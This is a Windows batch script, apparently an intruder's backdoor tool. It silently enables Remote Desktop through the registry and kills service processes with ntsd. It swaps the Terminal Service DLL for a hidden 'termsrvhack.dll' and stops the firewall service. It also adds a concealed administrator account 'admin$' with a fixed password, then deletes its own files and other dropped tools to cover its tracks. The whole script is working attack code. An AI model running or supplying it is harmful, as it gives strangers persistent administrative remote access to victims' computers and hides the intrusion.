@echo off
@echo Windows Registry Editor Version 5.00>>3389.reg 
@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
@echo "fDenyTSConnections"=dword:00000000>>3389.reg 
@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
@echo "PortNumber"=dword:00000d3d>>3389.reg 
@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
@echo "PortNumber"=dword:00000d3d>>3389.reg 
@regedit /s 3389.reg 
@del 3389.reg 
@Tasklist/SVC >>c:\3389.txt
@findstr "DcomLaunch, TermService" c:\3389.txt >c:\temp.txt
@FOR /F "eol=; tokens=1,2 delims= " %%i in (c:\temp.txt) do @echo %%j >c:\port.txt
@echo @echo off >c:\open_3389.bat
@echo @for /f %%%%i in (c:\port.txt) do @ntsd -c q -p %%%%i >>c:\open_3389.bat
@echo @REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon /v KeepRASConnections /t REG_SZ /d 1 /f >>c:\open_3389.bat
@echo @REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f >>c:\open_3389.bat
@echo @REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Licensing" "Core /v EnableConcurrentSessions /t REG_DWORD /d 00000001 /f >>c:\open_3389.bat
@echo @REG ADD HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %%SystemRoot%%\System32\termsrvhack.dll /f >>c:\open_3389.bat
@echo @copy termsrvhack.dll windows\system32\termsrvhack.dll >>c:\open_3389.bat
@echo @Attrib +H +S +R windows\system32\termsrvhack.dll >>c:\open_3389.bat
@echo @shutdown -a >>c:\open_3389.bat
@echo @net stop sharedaccess >>c:\open_3389.bat
@echo @net start dcomlaunch >>c:\open_3389.bat
@echo @net start termservice >>c:\open_3389.bat
@call c:\open_3389.bat
@net user admin$ qq1234 /add
@net localgroup administrators admin$ /add
@del c:\port.txt
@del c:\temp.txt
@del c:\3389.txt
@del c:\termsrvhack.dll
@del c:\open_3389.bat
@del c:\3389.exe
@del c:\3389.bat
@del c:\zz.exe
@del c:\shit.vbs